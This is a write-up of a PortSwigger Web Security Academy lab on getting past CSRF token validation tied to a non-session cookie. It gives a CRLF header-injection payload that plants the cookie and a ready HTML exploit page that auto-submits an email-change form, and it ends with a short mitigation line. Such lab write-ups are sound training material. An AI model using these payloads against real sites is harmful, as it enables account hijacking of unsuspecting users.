# Lab 04 — CSRF token tied to a non-session cookie

> **Expert** · [Official lab](https://portswigger.net/web-security/csrf/bypassing-token-validation/lab-token-tied-to-non-session-cookie)

**Entry point:** the `csrf` token is validated against the `csrfKey` cookie
— which is tied to nothing and can be planted.

## Solution

1. Note that swapping `csrfKey` breaks validation, but swapping **both**
   `csrfKey` + `csrf` together works — they are a portable pair.
2. Find the cookie-planting primitive: the search term is reflected into a
   **Set-Cookie header** (`GET /?search=...`), with no CSRF protection:

```
GET /?search=test%0d%0aSet-Cookie:%20csrfKey=YOUR-KEY%3b%20SameSite=None
```

(`%0d%0a` = CRLF header injection, `; SameSite=None` so the browser sends it
on the cross-site POST.)

3. Host the email-change form with **your own** `csrf` token, prefixed by an
   image that plants your `csrfKey` in the victim's browser:

```html
<img src="https://YOUR-LAB-ID.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrfKey=YOUR-KEY%3b%20SameSite=None"
     onerror="document.forms[0].submit()">
<form action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email" method="POST">
  <input type="hidden" name="email" value="anything@anything-you.net">
  <input type="hidden" name="csrf" value="YOUR-TOKEN">
</form>
```

4. Deliver to victim — their browser now carries your csrfKey, submits your
   matching token, and validation passes — lab solved.

## Mitigation

Tie the token to the **session** cookie; never let attacker-influenced input
land in response headers.
